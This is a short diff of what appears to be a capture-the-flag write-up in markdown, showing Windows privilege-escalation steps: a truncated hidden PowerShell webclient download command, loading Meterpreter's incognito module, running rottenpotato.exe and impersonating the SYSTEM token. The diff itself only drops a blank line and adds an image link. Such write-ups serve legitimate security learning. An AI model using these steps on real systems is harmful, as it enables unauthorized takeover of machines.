@@ -96,11 +96,11 @@ powershell.exe -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRe
 3. then we load meterpretert incognito: load incognito
 4. we execute the rottenpotato.exe file
 5. then we type:
-
 ```ruby
 impersonate_token "NT AUTHORITY\SYSTEM"
 ```
 and finally we get root level access.
+![](https://lh3.googleusercontent.com/zBWypHEBhLc6rJr4e0nfdaRSeTA51f4sOLArH4Jz_UlHQR7wxJ90Lsz4ohA_CoQv0AIDnwycooSnaCz9CqBnRHbzA80EkXYQa5cDtEIaCr06jkCFDl9P0Nz8n94mriplK7pPnNix-Pqbl1XHr5V4lnkVIHBch-K7NoazKkcKnxk9lsIwJcVNc_6w9JAy7muxtJHZnk0e29zCjKQnzJKtSb3Fmq-dq1RoeHWBiT4yv7bbehtyvzSUHhDCrEC040zNh5QNeUMNyUikSoylSkyk5b1sOks-qb5JuwdNAQPqhyPfjNcuPB9vs4ARnBOHwZtPZ6ML9fkYCdkhTYx__nEj1hxXPwXX8lSQMU6DyfVzsL3Yig6vlHFtvoYxgyUUlUx7cknjgoLm7ZYTJ6KqhiWmSFhb7cAjZpLC07V9_h90PReJ7KgFP0CQ2cXUOZpjzzrf5-nqDhbZXh9QAFJ7qbjRqeQ6c-E9aMn6dkdV6ONRqMrbw9P3HI6tGonaXaRa6tl4mYfB2aKQHf5t_uQ9oYzIdPGP0vz26cLW4wS2cm-wzGzn1nN5228YVD4Ju3n6q6xCGolE9LMzyPc5H_RACVnResBfUgvp8O-jt9pC3QrSy16t1kb2h0d8aNjbgonKh2J7wKKz4S7I8qx7BnkEyfH859uIb3V_1Ef8GlyEytzBJMf-q7x9ZeZOXxA=w656-h308-no)
 
 # Flags
 ```ruby
